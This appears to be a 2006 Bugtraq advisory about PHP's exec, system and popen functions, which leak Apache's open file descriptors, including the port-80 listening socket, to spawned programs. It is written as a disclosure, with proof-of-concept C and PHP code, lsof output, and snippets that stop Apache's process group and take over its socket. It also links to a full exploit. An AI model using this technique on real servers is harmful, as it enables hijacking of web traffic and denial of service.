@@ -1,0 +1,109 @@
+
+Date: Thu, 19 Oct 2006 10:53:54 +0600
+From: "Дмитрий Borgir" <dimmoborgir@...il.com>
+To: bugtraq@...urityfocus.com
+Subject: PHP "exec", "system", "popen" problem
+
+Vulnerable product:
+-------------------
+PHP ver. 4.4.3, 4.4.4, 5.0.4, 5.1.4, 5.1.6, 5.2.0RC5.
+Other PHP versions are very likely to have this problem.
+
+Description:
+------------
+The problem is in "exec", "system", "popen" (and similar) PHP functions.
+In fact, PHP doesn't sanitize opened file descriptors before executing
+a program.
+
+Cause:
+------
+These PHP functions use popen() C function to spawn a new process.
+The call of popen() is equivalent to the combination of
+- pipe (to create the pipe),
+- fork (to create the subprocess),
+- dup2 (to force the subprocess to use the pipe as its standard input
+or output channel),
+- exec (to execute the new program).
+These functions keep file descriptors of the parent process opened.
+So, when we run a new program via, e.g. "exec" PHP function, this
+program will inherit
+all opened file descriptors of its parent. In our case it is Apache web-server.
+(There is FD_CLOEXEC flag for file descriptors, which specifies that
+the file descriptor
+should be closed when an exec function is invoked. But Apache doesn't
+set this flag on it
+descriptors)
+
+This bug makes PHP File Include  vulnerabilities more dangerous.
+If the server uses mod_php and we are free to execute shell commands
+via system(),
+then we can easily manipulate inherited file descriptors. E.g. to
+listen and accept
+connections on 80 port (opened by Apache, and transmitted to us by PHP) or write
+anything to its accesslog or errorlog.
+
+Reproduce code:
+---------------
+Some steps to reproduce a bug.
+First. Simple program to wait :)
+
+# cat test1.c
+int main() {
+setsid( );
+sleep( 10000 );
+}
+
+#gcc -o test1 test1.c
+
+Ok. Let's make a php script:
+#cat a.php
+<?php system( "./test1" ) ?>
+
+Request: http://10.0.0.2/a.php
+
+Good. Now see opened file descriptors:
+
+#lsof | grep test1
+test1 cwd DIR /usr/local/apache2/htdocs
+test1 rtd DIR /
+test1 txt REG /var/www/html/test1
+test1 mem REG /lib/tls/libc- 2.3.5.so
+test1 mem REG /lib/ld-2.3.5.so
+test1 mem REG [stack] (stat: No such file or directory)
+test1 0r CHR /dev/null
+test1 1w FIFO pipe
+test1 2w REG /usr/local/apache2/logs/error_log
+test1 3u IPv4 *:http (LISTEN)
+test1 4r FIFO pipe
+test1 5w FIFO pipe
+test1 6w REG /usr/local/apache2/logs/error_log
+test1 7w REG /usr/local/apache2/logs/access_log
+test1 8r 0000 unknown inode type
+test1 9u IPv4 10.0.0.2:http->10.0.0.1:2134 (CLOSE_WAIT)
+
+So, our test1 has Apache's handles. Now we can do something like that
+(inside test1.c)
+
+int p = getsid( 0 ); // get current Process Group Id
+setsid( ); // become session leader
+kill( -p, SIGSTOP ); // good night, Apache Process Group :)
+
+And after that:
+
+for ( sock = 3; sock < getdtablesize(); sock++ ) // find valid socket handle
+if ( listen (sock, 10) == 0 ) break;
+Full exploit is available on http://hackerdom.ru/~dimmo/phpexpl.c
+
+php.net
+-------
+
+I described the bug on "bugs.php.net" on 21 Sep, but there is no
+feedback from the PHP Group.
+http://bugs.php.net/38915
+
+Greetz
+------
+
+archange1, jackrabbit, kost, VenRock, znick and others :)
+
+Special thanks to ilya for help.
